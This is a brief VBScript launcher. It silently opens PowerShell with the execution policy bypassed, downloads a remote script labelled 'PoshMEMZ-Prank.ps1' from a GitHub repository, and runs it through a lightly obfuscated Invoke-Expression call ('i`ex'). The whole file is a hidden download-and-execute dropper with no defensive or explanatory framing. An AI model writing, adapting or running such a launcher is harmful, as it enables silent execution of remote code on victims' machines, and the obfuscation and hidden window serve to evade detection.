Set WshShell = WScript.CreateObject("WScript.Shell")
WScript.Sleep 200
WshShell.Run "powershell.exe -Ep Bypass -C irm https://raw.githubusercontent.com/beigeworm/Powershell-Tools-and-Toys/main/Pranks/PoshMEMZ-Prank.ps1 | i`ex", 0, True

